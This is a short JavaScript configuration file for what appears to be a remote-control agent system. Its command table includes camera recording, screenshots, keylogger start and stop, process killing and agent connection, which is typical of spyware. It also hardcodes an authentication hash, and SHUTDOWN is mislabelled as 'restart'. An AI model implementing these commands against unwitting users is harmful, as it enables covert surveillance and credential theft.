export const CONFIG = {
    SERVER_PORT: 8080,
    AUTH_HASH: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
    LOCAL_STORAGE_ID_KEY: 'client_machine_id',

    CMD: {
        PING: "ping",
        PONG: "pong",
        AUTH: "auth",
        HEARTBEAT: "heartbeat",
        ERROR: "error",
        BROADCAST: "broadcast",

        APP_LIST: "LISTAPP",
        APP_START: "STARTAPP",
        APP_KILL: "STOPAPP",

        PROC_LIST: "LISTPROC",
        PROC_START: "STARTPROC",
        PROC_KILL: "STOPPROC",

        CAM_RECORD: "cam_record",
        SCREENSHOT: "SCRSHOT",
        START_KEYLOG: "STARTKLOG",
        STOP_KEYLOG: "STOPKLOG",

        SHUTDOWN: "restart",
        RESTART: "restart",

        ECHO: "echo",
        WHOAMI: "whoami",

        GET_AGENTS: "get_agents",
        AGEN_STATUS: "agent_status",
        CONNECT_AGENT: "connect_agent",
        STREAM_DATA: "stream_data",
        
        FILE_LIST: "file_list"
    },
    SCAN_TIMEOUT: 1500,
    SCAN_BATCH_SIZE: 30
};